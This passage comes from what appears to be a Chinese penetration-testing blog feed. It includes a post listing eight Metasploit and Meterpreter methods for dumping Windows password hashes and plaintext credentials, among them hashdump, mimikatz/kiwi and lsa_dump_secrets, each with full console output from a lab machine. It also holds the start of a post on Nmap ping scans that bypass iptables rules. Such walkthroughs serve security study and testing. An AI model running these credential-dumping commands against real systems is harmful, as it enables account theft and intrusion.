options...</span><br><span class="line">msf auxiliary(owa_iis_internal_ip) &gt; run</span><br></pre></td></tr></table></figure><hr><h3 id="F5-BigIP-Backend-Cookie-Disclosure"><a href="#F5-BigIP-Backend-Cookie-Disclosure" class="headerlink" title="F5 BigIP Backend Cookie Disclosure"></a>F5 BigIP Backend Cookie Disclosure</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/gather/f5_bigip_cookie_disclosure</span><br><span class="line">msf auxiliary(f5_bigip_cookie_disclosure) &gt; show actions</span><br><span class="line">     <span class="built_in">..</span>.actions<span class="built_in">..</span>.</span><br><span class="line">msf auxiliary(f5_bigip_cookie_disclosure) &gt; <span class="builtin-name">set</span> ACTION &lt;action-name&gt;</span><br><span class="line">msf auxiliary(f5_bigip_cookie_disclosure) &gt; show options</span><br><span class="line">     <span class="built_in">..</span>.show <span class="keyword">and</span> <span class="builtin-name">set</span> options<span class="built_in">..</span>.</span><br><span class="line">msf auxiliary(f5_bigip_cookie_disclosure) &gt; run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取Windows系统密码hash的几种方法</title>
      <link href="/2018/04/09/%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81hash%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2018/04/09/%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81hash%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="使用metasploit框架提取的密码"><a href="#使用metasploit框架提取的密码" class="headerlink" title="使用metasploit框架提取的密码"></a>使用metasploit框架提取的密码</h3><hr><h3 id="第一种-hashdump"><a href="#第一种-hashdump" class="headerlink" title="第一种 hashdump"></a>第一种 hashdump</h3><p>执行下面的命令，将获取所有Windows用户保存的所有密码的哈希值<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">hashdump</span> </span><br><span class="line"><span class="selector-tag">Administrator</span><span class="selector-pseudo">:500</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:c5a237b7e9d8e708d8436b6148a25fa1</span>:::</span><br><span class="line"><span class="selector-tag">Guest</span><span class="selector-pseudo">:501</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="line"><span class="selector-tag">test</span><span class="selector-pseudo">:1000</span><span class="selector-pseudo">:aad3b435b51404eeaad3b435b51404ee</span><span class="selector-pseudo">:c5a237b7e9d8e708d8436b6148a25fa1</span>:::</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure></p><p>获取到hash之后你们可以有john加字典进行破解，还可以到在线的破解网站<a href="https://www.onlinehashcrack.com/" target="_blank" rel="noopener">点我</a>提交hash破解。</p><a id="more"></a><h3 id="第二种-run-post-windows-gather-hashdump"><a href="#第二种-run-post-windows-gather-hashdump" class="headerlink" title="第二种 run post/windows/gather/hashdump"></a>第二种 run post/windows/gather/hashdump</h3><p>该模块将使用注册表从SAM数据库获取本地用户帐户，和上一个不一样的是看到test:”test”没。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key<span class="built_in">..</span>.</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 73a2a371e4c81f43ef47d86b3bf5d27b<span class="built_in">..</span>.</span><br><span class="line">[*] Obtaining the<span class="built_in"> user </span>list <span class="keyword">and</span> keys<span class="built_in">..</span>.</span><br><span class="line">[*] Decrypting<span class="built_in"> user </span>keys<span class="built_in">..</span>.</span><br><span class="line">[*] Dumping password hints<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">test:<span class="string">"test"</span></span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">test:1000:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br></pre></td></tr></table></figure></p><h3 id="第三种-run-post-windows-gather-smart-hashdump"><a href="#第三种-run-post-windows-gather-smart-hashdump" class="headerlink" title="第三种 run post/windows/gather/smart_hashdump"></a>第三种 run post/windows/gather/smart_hashdump</h3><p>和上一个差不多<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">[*] Hashes will be saved <span class="keyword">to</span> the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format <span class="keyword">to</span>:</span><br><span class="line">[*] /root/.msf4/loot/20180208054244_default_192.168.137.128_windows.hashes_811529.txt</span><br><span class="line">[*] Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line">[*] Running as<span class="built_in"> SYSTEM </span>extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*]     Obtaining the boot key<span class="built_in">..</span>.</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 73a2a371e4c81f43ef47d86b3bf5d27b<span class="built_in">..</span>.</span><br><span class="line">[*]     Obtaining the<span class="built_in"> user </span>list <span class="keyword">and</span> keys<span class="built_in">..</span>.</span><br><span class="line">[*]     Decrypting<span class="built_in"> user </span>keys<span class="built_in">..</span>.</span><br><span class="line">[*]     Dumping password hints<span class="built_in">..</span>.</span><br><span class="line">[+]     test:<span class="string">"test"</span></span><br><span class="line">[*]     Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br><span class="line">[+]     test:1000:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::</span><br></pre></td></tr></table></figure></p><h3 id="第四种-run-post-windows-gather-credentials-credential-collector"><a href="#第四种-run-post-windows-gather-credentials-credential-collector" class="headerlink" title="第四种 run post/windows/gather/credentials/credential_collector"></a>第四种 run post/windows/gather/credentials/credential_collector</h3><p>多了一点东西，emmmm<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/credentials/credential_collector</span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">[+] Collecting hashes<span class="built_in">..</span>.</span><br><span class="line">    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line">    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">    Extracted: test:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line">[+] Collecting tokens<span class="built_in">..</span>.</span><br><span class="line">    NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">    NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">    NT AUTHORITY\SYSTEM</span><br><span class="line">    test-PC\Administrator</span><br><span class="line">    test-PC\test</span><br><span class="line">    NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure></p><h3 id="第五种-run-post-windows-gather-credentials-sso"><a href="#第五种-run-post-windows-gather-credentials-sso" class="headerlink" title="第五种 run post/windows/gather/credentials/sso"></a>第五种 run post/windows/gather/credentials/sso</h3><p>这个就比较6一点，直接显示明文了。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> post/windows/gather/credentials/sso </span><br><span class="line"></span><br><span class="line">[*] Running module against TEST-PC</span><br><span class="line">Windows SSO Credentials</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">AuthID      Package    Domain       <span class="built_in"> User </span>          Password</span><br><span class="line">------      -------    ------        ----           --------</span><br><span class="line">0;145220    NTLM       test-PC       Administrator  test123</span><br><span class="line">0;23330968  NTLM       test-PC       Administrator  test123</span><br><span class="line">0;24520612  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24619626  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24717059  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24986730  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;25063663  Negotiate  test-PC       Administrator  </span><br><span class="line">0;3565115   NTLM       test-PC       test           test123</span><br><span class="line">0;3565139   NTLM       test-PC       test           test123</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><h3 id="第六种-load-kiwi"><a href="#第六种-load-kiwi" class="headerlink" title="第六种 load kiwi"></a>第六种 load kiwi</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz <span class="number">2.1</span><span class="number">.1</span> <span class="number">20170608</span> (x86/windows)</span><br><span class="line"> .## ^ ##.  <span class="string">"A La Vie, A L'Amour"</span></span><br><span class="line"> ## / \ ##  <span class="comment">/* * *</span></span><br><span class="line"><span class="comment"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"><span class="comment"> '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)</span></span><br><span class="line"><span class="comment">  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */</span></span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure><p>我们先来看一下Kiwi的帮助<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                Description</span><br><span class="line">    -------                -----------</span><br><span class="line">    creds_all              Retrieve all credentials (parsed)</span><br><span class="line">    creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">    creds_msv              Retrieve LM/NTLM creds (parsed)</span><br><span class="line">    creds_ssp              Retrieve SSP creds</span><br><span class="line">    creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">    creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">    dcsync                 Retrieve<span class="built_in"> user </span>account information via DCSync (unparsed)</span><br><span class="line">    dcsync_ntlm            Retrieve<span class="built_in"> user </span>account NTLM hash, SID <span class="keyword">and</span> RID via DCSync</span><br><span class="line">    golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">    kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">    kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)</span><br><span class="line">    lsa_dump_sam           Dump LSA SAM (unparsed)</span><br><span class="line">    lsa_dump_secrets       Dump LSA secrets (unparsed)</span><br><span class="line">    password_change        Change the password/hash of a user</span><br><span class="line">    wifi_list              List wifi profiles/creds <span class="keyword">for</span> the current user</span><br><span class="line">    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)</span><br></pre></td></tr></table></figure></p><p>自己可以都试一下,但是有些功能在system权限下是用不了的，反人类吧。降权啊。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : TEST-PC</span><br><span class="line">SysKey : 73a2a371e4c81f43ef47d86b3bf5d27b</span><br><span class="line">Local SID : S-1-5-21-553051396-1028234690-3130437969</span><br><span class="line"></span><br><span class="line">SAMKey : ef5996069dea28d34bd17473b9f86386</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : test</span><br><span class="line">LM   : </span><br><span class="line">NTLM : c5a237b7e9d8e708d8436b6148a25fa1</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : TEST-PC</span><br><span class="line">SysKey : 73a2a371e4c81f43ef47d86b3bf5d27b</span><br><span class="line"></span><br><span class="line">Local name : test-PC ( S-1-5-21-553051396-1028234690-3130437969 )</span><br><span class="line">Domain name : WORKGROUP</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.11</span><br><span class="line">LSA Key(s) : 1,<span class="built_in"> default </span>&#123;134f8789-8d77-b8a1-d7cd-d1a7758f90dd&#125;</span><br><span class="line">  [00] &#123;134f8789-8d77-b8a1-d7cd-d1a7758f90dd&#125; 184b95d332248097138abc2d5a393b0a9f1f8df3fccaf9db9b33b46d0167a8a4</span><br><span class="line"></span><br><span class="line">Secret  : DefaultPassword</span><br><span class="line">old/text: test123</span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 32 52 75 7c 26 4e 12 a4 cb e1 ce 08 0c fa 8d 34 25 47 cb 95 fc d3 b8 60 34 9d 89 8c 0c e1 29 82 a5 bd ce 19 63 bf bf a2 </span><br><span class="line">    full: 3252757c264e12a4cbe1ce080cfa8d342547cb95fcd3b860349d898c0ce12982a5bdce1963bfbfa2</span><br><span class="line">    m/u : 3252757c264e12a4cbe1ce080cfa8d342547cb95 / fcd3b860349d898c0ce12982a5bdce1963bfbfa2</span><br><span class="line">old/hex : 01 00 00 00 bb 25 c5 89 14 75 57 dd e8 27 78 60 84 26 9e 8f f9 51 6c 86 f6 2d 06 1a 88 97 d6 cb 2d 1c 38 19 0b c3 c9 01 88 d3 6f a2 </span><br><span class="line">    full: bb25c589147557dde827786084269e8ff9516c86f62d061a8897d6cb2d1c38190bc3c90188d36fa2</span><br><span class="line">    m/u : bb25c589147557dde827786084269e8ff9516c86 / f62d061a8897d6cb2d1c38190bc3c90188d36fa2</span><br><span class="line"></span><br><span class="line">Secret  : NL<span class="variable">$KM</span></span><br><span class="line">cur/hex : b0 03 03 0b 04 67 9a 3e 30 ee a0 d6 e1 72 78 80 07 27 6c 00 4a bd 3d b5 22 cb bf a1 18 04 51 3f af 64 44 c0 b6 46 bf df 62 f7 84 eb 02 6c 66 d9 df ee aa 52 49 ae 6e 05 55 8b 38 f9 10 7d 48 23 </span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><h3 id="第七种-run-post-windows-gather-phish-windows-credentials"><a href="#第七种-run-post-windows-gather-phish-windows-credentials" class="headerlink" title="第七种 run post/windows/gather/phish_windows_credentials"></a>第七种 run post/windows/gather/phish_windows_credentials</h3><p>这个是调用powershell来执行的，有些服务器有禁用powershell，emmmm等我找到没有锁的再补充。<br>但是还有一个run powerdump也可以的。</p><h3 id="第八种-load-mimikatz"><a href="#第八种-load-mimikatz" class="headerlink" title="第八种 load mimikatz"></a>第八种 load mimikatz</h3><p>也是我常用的一种。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz<span class="built_in">..</span>.Success.</span><br><span class="line">meterpreter &gt; kerberos </span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving kerberos credentials</span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">AuthID      Package    Domain       <span class="built_in"> User </span>          Password</span><br><span class="line">------      -------    ------        ----           --------</span><br><span class="line">0;25063663  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24986730  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24717059  Negotiate  NT AUTHORITY <span class="built_in"> SYSTEM </span>        </span><br><span class="line">0;24619626  Negotiate  test-PC       Administrator  </span><br><span class="line">0;24520612  Negotiate  test-PC       Administrator  </span><br><span class="line">0;997       Negotiate  NT AUTHORITY  LOCAL<span class="built_in"> SERVICE </span> </span><br><span class="line">0;996       Negotiate  WORKGROUP     TEST-PC$       </span><br><span class="line">0;22190     NTLM                                    </span><br><span class="line">0;999       NTLM       WORKGROUP     TEST-PC$       </span><br><span class="line">0;23330968  NTLM       test-PC       Administrator  test123</span><br><span class="line">0;3565139   NTLM       test-PC       test           test123</span><br><span class="line">0;3565115   NTLM       test-PC       test           test123</span><br><span class="line">0;145220    NTLM       test-PC       Administrator  test123</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><hr><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>较麻烦：post/windows/manage/change_password<br>自己show options看看</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>Win系统怎么改的？进入shell net user XXX XXX</p><p>参考：<a href="https://payloads.online/archivers/2017-12-28/1" target="_blank" rel="noopener">倾旋的博客-针对国内一大厂的后渗透 - 持续</a><br>有4种常用的就够了，有时其他不管用才会用其他的</p>]]></content>
      
      
      
        <tags>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 扫描(防火墙 Bypass)</title>
      <link href="/2018/04/09/Nmap-%E6%89%AB%E6%8F%8F-%E9%98%B2%E7%81%AB%E5%A2%99-Bypass/"/>
      <url>/2018/04/09/Nmap-%E6%89%AB%E6%8F%8F-%E9%98%B2%E7%81%AB%E5%A2%99-Bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-Ping-扫描-防火墙-Bypass"><a href="#Nmap-Ping-扫描-防火墙-Bypass" class="headerlink" title="Nmap Ping 扫描(防火墙 Bypass)"></a>Nmap Ping 扫描(防火墙 Bypass)</h1><hr><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><ul><li>在本文中，我们将使用不同的Nmap Ping扫描来扫描发现目标主机。</li><li>一个系统管理员可能只会使用Ping来检测某个主机是否存活，但一个安全人员可能会使用各种方法绕过防火墙进行检测。</li><li><p>在Namp中使用Ping扫描来检测主机是否存活。我们知道在默认情况下，Ping发送ICMP回应请求，并在系统处于活动状态时获取ICMP响应回复。默认情况下，Ping扫描发送一个ARP数据包来获取主机是否存活。</p></li><li><p>Nmap会根据它扫描的网络来改变它的扫描方式。<br><em>1.</em>如果扫描的是本地网络，Nmap在每次扫描时发送ARP数据包<br><em>2.</em>如果时扫描外网就发送以下请求数据包：</p><blockquote><ol><li>ICMP回应请求</li><li>ICMP时间戳请求</li><li>TCP SYN到端口443</li><li>TCP ACK到端口80</li></ol></blockquote></li><li><p>在本文，我们使用-disable-arp-ping属性来更改Nmap的扫描行为，将本地网络当作外网。</p></li></ul><a id="more"></a><h3 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h3><ul><li>为了在不使用ARP请求数据包的情况下识别存活主机，Nmap使用称扫描的-sP选项。我们可以使用-sn标志，这意味没有端口扫描也称为Ping扫描。</li><li>我的IP：172.17.0.1【Ubuntu】</li><li>目标IP：172.17.0.2 【Ubuntu】- docker<blockquote><p>sudo nmap -sP 172.17.0.2 -disable-arp-ping</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.01</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2018-03-06 16:58 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">Host is up (<span class="number">0.00013</span>s latency).</span><br><span class="line">MAC <span class="string">Address:</span> <span class="number">02</span>:<span class="number">42</span>:<span class="string">AC:</span><span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> (Unknown)</span><br><span class="line">Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.31</span> seconds</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>或者</p><blockquote><p>sudo nmap -sn 172.17.0.2 -disable-arp-ping<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap <span class="number">7.01</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2018-03-06 16:59 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">Host is up (<span class="number">0.000096</span>s latency).</span><br><span class="line">MAC <span class="string">Address:</span> <span class="number">02</span>:<span class="number">42</span>:<span class="string">AC:</span><span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> (Unknown)</span><br><span class="line">Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.29</span> seconds</span><br></pre></td></tr></table></figure></p></blockquote><ul><li><p>从上面可以看到它发现有一台主机存活。再看下面的图片，由于我使用了参数–disable-arp-ping禁用了本地网络扫描的ARP请求数据包，所以这里并没有看到ARP请求。</p></li><li><p>通过wireshark可以看到这连个网络之间的请求和响应</p></li></ul><ol><li>ICMP回应请求</li><li>ICMP回应回复</li><li>TCP SYN到端口443</li><li>TCP RST，ACK到端口443</li><li>TCP ACK到端口80</li><li>TCP RST到端口80</li><li>ICMP时间戳请求</li><li>ICMP时间戳答复<h3 id="防Ping扫描"><a href="#防Ping扫描" class="headerlink" title="防Ping扫描"></a>防Ping扫描</h3></li></ol><ul><li>现在我在docker中用IPTABLES设置防火墙规则来拦截刚刚看到的ICMP数据包和443端口上的TCP SYN数据包还有80端口上的TCP ACK数据包，就应该可以防Ping扫描来了。<h3 id="出了点状况"><a href="#出了点状况" class="headerlink" title="出了点状况"></a>出了点状况</h3><blockquote><p>docker的iptables出了问题</p></blockquote></li><li>现在我的IP改为：192.168.43.236</li><li><p>目标IP改为：192.168.43.119 (虚拟机)</p></li><li><p>好，我们接着上面在目标主机设置防火墙：</p><blockquote><p>sudo iptables -I INPUT -p ICMP -j DROP<br>sudo iptables -I INPUT -p tcp –tcp-flags ALL ACK –dport 80 -j DROP<br>sudo iptables -I INPUT -p tcp –tcp-flags ALL SYN –dport 443 -j DROP</p></blockquote></li><li><p>现在我们在来扫一下，看到并没有检测到有存活主机，这说明我们配置的防火墙成功拦截了Nmap的Ping扫描。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.43.119 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-06 23:46 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 3.08 seconds</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用TCP-SYN-Ping绕过防火墙"><a href="#使用TCP-SYN-Ping绕过防火墙" class="headerlink" title="使用TCP SYN Ping绕过防火墙"></a>使用TCP SYN Ping绕过防火墙</h3><ul><li><p>下面的就可以发现存活主机了哦。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PS 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 20:11 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ubuntu (192.168.43.132)</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.31 